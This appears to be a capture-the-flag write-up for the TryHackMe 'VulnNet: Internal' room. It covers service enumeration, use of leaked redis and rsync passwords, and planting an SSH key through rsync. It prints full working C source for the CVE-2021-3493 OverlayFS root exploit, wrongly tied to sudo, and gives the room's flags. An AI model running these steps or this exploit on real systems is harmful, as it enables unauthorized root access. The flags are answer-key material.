---
title: Vulnet:Internal
layout: post
author: Bit Criminals Team
date: 2021-05-06 17:02:00 +0530
type: Pentesting
difficulty: Medium
prompt: https://tryhackme.com/room/vulnnetinternal
---

Running a full port Nmap scan,I got some uncommon and interesting ports.

![](/images/nmap1.png)

Apart from these we also got 

![](/images/ports.png)

Thus we got ourselves **a SMB , NFS , redis and a rsync port** which appeared worthy of enumerating to me.

First a enumerate the SMB port 

![](/images/smb.png)

You can always tag help to know about the SMB port commnads if you have no idea
We get our first flag here.

After this,we enumerate the NFS port,

First we know about the directory to be mounted and then,mount it in our local machine.

![](/images/nfs.png)

After, that we find a redis directory in the mounted dir.Within, the redis dir we found a redis.conf file.

Within the redis.conf file we found a password
***B65Hx562F@ggAZ@F***
which is most probably the password for the redis port.


After getting the password, now we know that we have to connect to redis
So `redis-cli -h <ip>` will work in this case.And then we have to give the password and enumerate it further.I used these commands 

```py
redis-cli -h 10.10.61.143
AUTH B65Hx562F@ggAZ@F
SELECT 0
KEYS *
lrange "authlist" 0 4
GET "internal flag"
```
![redis](https://user-images.githubusercontent.com/78094309/117819781-81074b00-b287-11eb-8d19-ef111a5e25fd.png)


And hence we found our internal flag and also got another password with a hint that we have to connect to rsync..

```
THM{ff8e518addbbddb74531a724236a8221}
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v



Now we connected to rsync and got the user flag in the sys-internal User's directory

![](/images/rsync.png)

```User flag : THM{da7c20696831f253e0afaca8b83c07ab}```

Now we created an id_rsa key and using rsync transferred this key to authorised keys folder in the sys-internal User's directory 
The commands are:

```py
ssh-keygen -f ./id_rsa
rsync -ahv ./id_rsa.pub rsync://rsync-connect@<ip>/files/sys-internal/.ssh/authorized_keys
ssh -i ./id_rsa sys-internal@10.10.53.133
```

![](/images/ssh.png)

And then we connected using ssh to the machine..

![](/images/ssh2.png)

After searching thoroughly through the machine we did not find anything that could be counted as a vulnerability to exploit in order to gain root privileges, so we turn to the sudo version. Googling for exploits on the sudo version we find a vulnerability CVE-2021-3493 which allows to user to mount to root privileges.

So we copy the exploit code into a file in the /tmp directory using nano and compile the code.

```cpp
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mount.h>

//#include <attr/xattr.h>
//#include <sys/xattr.h>
int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);


#define DIR_BASE    "./ovlcap"
#define DIR_WORK    DIR_BASE "/work"
#define DIR_LOWER   DIR_BASE "/lower"
#define DIR_UPPER   DIR_BASE "/upper"
#define DIR_MERGE   DIR_BASE "/merge"
#define BIN_MERGE   DIR_MERGE "/magic"
#define BIN_UPPER   DIR_UPPER "/magic"


static void xmkdir(const char *path, mode_t mode)
{
    if (mkdir(path, mode) == -1 && errno != EEXIST)
        err(1, "mkdir %s", path);
}

static void xwritefile(const char *path, const char *data)
{
    int fd = open(path, O_WRONLY);
    if (fd == -1)
        err(1, "open %s", path);
    ssize_t len = (ssize_t) strlen(data);
    if (write(fd, data, len) != len)
        err(1, "write %s", path);
    close(fd);
}

static void xcopyfile(const char *src, const char *dst, mode_t mode)
{
    int fi, fo;

    if ((fi = open(src, O_RDONLY)) == -1)
        err(1, "open %s", src);
    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
        err(1, "open %s", dst);

    char buf[4096];
    ssize_t rd, wr;

    for (;;) {
        rd = read(fi, buf, sizeof(buf));
        if (rd == 0) {
            break;
        } else if (rd == -1) {
            if (errno == EINTR)
                continue;
            err(1, "read %s", src);
        }

        char *p = buf;
        while (rd > 0) {
            wr = write(fo, p, rd);
            if (wr == -1) {
                if (errno == EINTR)
                    continue;
                err(1, "write %s", dst);
            }
            p += wr;
            rd -= wr;
        }
    }

    close(fi);
    close(fo);
}

static int exploit()
{
    char buf[4096];

    sprintf(buf, "rm -rf '%s/'", DIR_BASE);
    system(buf);

    xmkdir(DIR_BASE, 0777);
    xmkdir(DIR_WORK,  0777);
    xmkdir(DIR_LOWER, 0777);
    xmkdir(DIR_UPPER, 0777);
    xmkdir(DIR_MERGE, 0777);

    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
        err(1, "unshare");

    xwritefile("/proc/self/setgroups", "deny");

    sprintf(buf, "0 %d 1", uid);
    xwritefile("/proc/self/uid_map", buf);

    sprintf(buf, "0 %d 1", gid);
    xwritefile("/proc/self/gid_map", buf);

    sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
    if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
        err(1, "mount %s", DIR_MERGE);

    // all+ep
    char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";

    xcopyfile("/proc/self/exe", BIN_MERGE, 0777);
    if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)
        err(1, "setxattr %s", BIN_MERGE);

    return 0;
}

int main(int argc, char *argv[])
{
    if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "shell"))) {
        setuid(0);
        setgid(0);
        execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
        err(1, "execl /bin/bash");
    }

    pid_t child = fork();
    if (child == -1)
        err(1, "fork");

    if (child == 0) {
        _exit(exploit());
    } else {
        waitpid(child, NULL, 0);
    }

    execl(BIN_UPPER, BIN_UPPER, "shell", NULL);
    err(1, "execl %s", BIN_UPPER);
}

```
Executing the compiled code gives us root privileges. From there we go to the /root directory and print the contents of root.txt to obtain the root flag.

![](/images/MaskdMafia/internal.png)

```Root Flag:THM{e8996faea46df09dba5676dd271c60bd}```
